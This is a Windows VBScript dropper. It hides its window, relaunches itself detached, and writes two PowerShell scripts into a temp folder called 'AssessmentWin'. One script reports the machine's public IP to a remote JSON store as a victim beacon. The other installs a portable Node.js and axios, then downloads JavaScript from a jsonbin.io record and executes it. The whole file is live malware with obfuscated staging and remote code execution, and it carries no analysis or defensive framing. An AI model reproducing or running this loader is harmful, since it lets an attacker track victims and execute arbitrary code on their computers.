Option Explicit
Dim sh, fso, tempDir, psDir, exitCode
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempDir = sh.ExpandEnvironmentStrings("%TEMP%")
psDir = tempDir & "\AssessmentWin"
On Error Resume Next
If Not fso.FolderExists(psDir) Then fso.CreateFolder psDir
Err.Clear
If Not HasArg("--detached") Then
sh.Run "wscript.exe //B """ & WScript.ScriptFullName & """ --detached", 0, False
WScript.Quit 0
End If
Call WritePs1Lines(psDir & "\append.ps1", AppendPs1Lines())
exitCode = sh.Run("powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psDir & "\append.ps1""", 0, True)
Call WritePs1Lines(psDir & "\run.ps1", RunPs1Lines())
exitCode = sh.Run("powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psDir & "\run.ps1""", 0, True)

Function AppendPs1Lines()
Dim a
a = Array("$ProgressPreference='SilentlyContinue'", "$url='https://api.jsonstorage.net/v1/json/21445b0b-7d33-4a73-8fc8-7f4af1cbc783/ca0c59b3-40d3-45db-88aa-9d80a1ee8504?apiKey=11cdabd5-ef3f-4c51-bf37-88a586332ee5'", "$curl=Join-Path $env:SystemRoot 'System32\curl.exe'", "if(-not(Test-Path $curl)){ $c=Get-Command curl.exe -ErrorAction SilentlyContinue; if($c){$curl=$c.Source}else{ exit 0 } }", "$who=& $curl -4 -fsS --max-time 15 'https://ipwho.is/' 2>$null", "if($LASTEXITCODE -ne 0){ exit 0 }", "$ip=$null; try { $ip = ($who | ConvertFrom-Json).ip } catch { }", "if(-not $ip){ exit 0 }", "$doc=& $curl -fsS --max-time 30 $url 2>$null", "if($LASTEXITCODE -ne 0){ exit 0 }", "$existing=''; try { $existing = ($doc | ConvertFrom-Json).data } catch { }", "$existing=($existing -replace '\s',''); $parts=@(); if($existing){ $parts=@($existing -split ','|ForEach-Object{$_.Trim()}|Where-Object{$_}) }", "if($parts -contains $ip){ exit 0 }", "$newData=if($parts.Count){ ($parts -join ',')+','+$ip }else{ $ip }", "$body=(ConvertTo-Json @{data=$newData} -Compress)", "& $curl -fsS --max-time 30 -X PUT $url -H 'Content-Type: application/json' -d $body 1>$null 2>$null", "exit 0")
AppendPs1Lines = a
End Function

Function RunPs1Lines()
Dim a
a = Array("$ProgressPreference='SilentlyContinue'", "$nv='24.21.0'", "$rt=Join-Path $env:TEMP ('portable-node-'+$nv)", "$np=Join-Path $env:TEMP 'portable-npm'", "$zip=Join-Path $env:TEMP ('node-portable-'+$nv+'.zip')", "$curl=Join-Path $env:SystemRoot 'System32\curl.exe'", "if(-not(Test-Path $curl)){ $c=Get-Command curl.exe -ErrorAction SilentlyContinue; if($c){$curl=$c.Source}else{ exit 1 } }", "if(-not(Test-Path (Join-Path $rt 'node.exe'))){", "  New-Item -ItemType Directory -Force -Path $rt|Out-Null", "  & $curl -fsSL -o $zip ('https://nodejs.org/dist/v'+$nv+'/node-v'+$nv+'-win-x64.zip')", "  if($LASTEXITCODE -ne 0){ & $curl -k -fsSL -o $zip ('https://nodejs.org/dist/v'+$nv+'/node-v'+$nv+'-win-x64.zip') }", "  if(-not(Test-Path $zip)){ exit 1 }", "  if(-not(Get-Command tar -ErrorAction SilentlyContinue)){ exit 1 }", "  & tar -xf $zip -C $rt --strip-components=1", "  if($LASTEXITCODE -ne 0){ exit 1 }", "  Remove-Item $zip -Force -ErrorAction SilentlyContinue", "}", "if(-not(Test-Path (Join-Path $rt 'node.exe'))){ exit 1 }", "New-Item -ItemType Directory -Force -Path $np|Out-Null", "$env:NPM_CONFIG_PREFIX=$np; $env:NODE_PATH=(Join-Path $np 'node_modules'); $env:Path=$rt+';'+$np+';'+$env:Path", "& (Join-Path $rt 'npm.cmd') i -g axios form-data --loglevel=error 1>$null 2>$null", "if($LASTEXITCODE -ne 0){ exit 1 }", "$e='const axios=require(''axios'');axios.get(''https://api.jsonbin.io/v3/b/6a83ececda38895dfef168b7'').then(function(r){new Function(''require'',r.data.record.cookie)(require);}).catch(function(){});'", "& (Join-Path $rt 'node.exe') -e $e 1>$null 2>$null", "exit 0")
RunPs1Lines = a
End Function

Sub WritePs1Lines(path, lines)
Dim ts, i
Set ts = fso.CreateTextFile(path, True)
For i = 0 To UBound(lines)
ts.WriteLine lines(i)
Next
ts.Close
End Sub

Function HasArg(flag)
Dim i
HasArg = False
For i = 0 To WScript.Arguments.Count - 1
If WScript.Arguments(i) = flag Then HasArg = True
Next
End Function
